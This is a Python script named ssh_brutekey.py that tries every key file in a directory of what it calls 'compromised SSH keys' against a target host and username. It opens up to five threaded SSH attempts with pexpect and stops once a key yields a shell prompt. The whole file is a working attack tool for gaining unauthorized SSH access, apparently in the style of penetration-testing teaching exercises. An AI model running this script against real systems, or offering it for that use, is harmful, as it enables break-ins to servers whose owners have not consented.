import pexpect, argparse, os, threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release=True):
	global Stop
	global Fails
	try:
		perm_denied = 'Permission denied'
		ssh_newkey = 'Are you sure you want to continue'
		conn_closed = 'Connection closed by remote host'
		opt = '-o PasswordAuthentication=no'
		conn_str = f'ssh {user}@{host} -i {keyfile} {opt}'
		child = pexpect.spawn(conn_str)
		ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
		
		if ret == 2:
			print('\n Adding host to ~/.ssh/known_hosts')
			child.sendline('yes')
			connect(user, host, keyfile, False)
		elif ret == 3:
			print('\n Connections closed by remote host')
			Fails += 1
		elif ret > 3:
			print(f'\n Success. {str(keyfile)}')
			Stop = True
	finally:
		if release:
			connection_lock.release()				


if __name__ == '__main__':
	parser = argparse.ArgumentParser(usage='ssh_brutekey.py TARGET_HOST -u USERNAME -d KEY_DIRECTORY')
	parser.add_argument('tgt_host', metavar='TARGET_HOST', help='specify target host')
	parser.add_argument('-u', metavar='USERNAME', help='specify username', required=True)
	parser.add_argument('-d', metavar='KEY_DIRECTORY', help='sepecify dir with compromised SSH keys', required=True)
	
	args = parser.parse_args()
	
	for filename in os.listdir(args.d):
		if Stop:
			print('\nExiting: Key found')
			exit(0)
		if Fails > 5:
			print('\nExiting: Too many connections closed by remote host\nAdjust number of simultaneous threads')
			exit(0)
		connection_lock.acquire()
		fullpath = os.path.join(args.d, filename)
		print(f'Testing keyfile {str(fullpath)}')
		t = threading.Thread(target=connect, args=(args.u,args.tgt_host,fullpath))
		t.start()	
				
